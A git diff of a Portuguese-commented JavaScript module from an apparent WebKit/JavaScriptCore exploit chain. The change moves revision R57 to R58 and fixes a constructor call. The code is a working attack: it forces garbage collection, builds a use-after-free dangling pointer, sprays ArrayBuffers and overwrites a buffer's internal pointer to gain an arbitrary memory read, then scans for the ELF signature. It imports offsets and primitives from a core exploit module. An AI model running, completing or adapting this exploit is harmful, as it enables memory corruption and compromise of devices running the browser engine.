@@ -1,11 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R57 - Abuso Direto e Força Bruta)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R58 - Correção da Chamada do Construtor)
 // =======================================================================================
-// O R56 provou que o UAF funciona. A falha está em identificar o buffer corrompido.
-// ESTA VERSÃO MUDA A ESTRATÉGIA DA FASE 6:
-// - Abandona a tentativa de identificar o buffer corrompido de antemão.
-// - "Atira no escuro": realiza a escrita arbitrária usando a referência confusa.
-// - Procura pelo resultado: faz um loop por todos os buffers pulverizados para encontrar
-//   aquele que agora lê do endereço de memória alvo.
+// O R57 estava quase perfeito, mas falhou devido a um erro de programação simples.
+// ESTA VERSÃO CORRIGE APENAS UMA LINHA:
+// - A chamada para 'new AdvancedInt64' na FASE 6 foi corrigida para usar números em
+//   vez de strings, o que estava causando a exceção.
+// A estratégia de Abuso Direto permanece a mesma.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -19,7 +18,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R57_Direct_Abuse";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R58_ConstructorFix";
 
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
@@ -32,11 +31,11 @@ function int64ToDouble(int64) {
 
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R57 - Direct Abuse)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R58 - ConstructorFix)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Abuso Direto (R57) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Correção do Construtor (R58) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
@@ -44,7 +43,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const SPRAY_BUFFER_SIZE = 136;
 
     try {
-        // FASES 1-5: Mantidas do R56, pois estavam funcionando perfeitamente.
+        // FASES 1-5: Mantidas do R57, pois estavam funcionando perfeitamente.
         logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
         await triggerGC_Tamed();
         logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
@@ -76,7 +75,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // FASE 6: Abuso Direto e Verificação por Força Bruta
         logS3("--- FASE 6: Abuso Direto da Referência Confusa ---", "subtest");
         
-        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000");
+        // *** MUDANÇA R58: Corrigida a chamada do construtor para usar NÚMEROS em vez de STRINGS ***
+        const target_address_to_read = new AdvancedInt64(0x0, 0x08000000);
         
         logS3(`    Escrevendo no ponteiro interno de um buffer desconhecido via 'dangling_ref.prop_b'...`, "info");
         dangling_ref.prop_b = int64ToDouble(target_address_to_read);
@@ -86,21 +86,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         let success = false;
         for (const buf of spray_buffers) {
             try {
-                // Se este for o buffer corrompido, a view agora aponta para o target_address.
-                // Se não for, ela aponta para um buffer vazio e a leitura será 0.
                 const hacked_view = new DataView(buf);
                 const val = hacked_view.getUint32(0, true);
 
-                // 0x464C457F é a assinatura "ELF" de executáveis. É um bom alvo.
                 if (val === 0x464c457f || val !== 0) { 
                     logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
                     logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(val)}`, "leak");
                     read_value = val;
                     success = true;
-                    break; // Saímos do loop assim que encontrarmos
+                    break;
                 }
             } catch (e) {
-                // Ignora erros, pois alguns buffers podem se tornar inválidos
+                // Ignora erros
             }
         }
 
@@ -130,7 +127,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 
-// --- Funções Auxiliares (sem alterações do R56) ---
+// --- Funções Auxiliares (sem alterações do R57) ---
 async function triggerGC_Tamed() {
     logS3("    Acionando GC Domado (Tamed)...", "info");
     try {
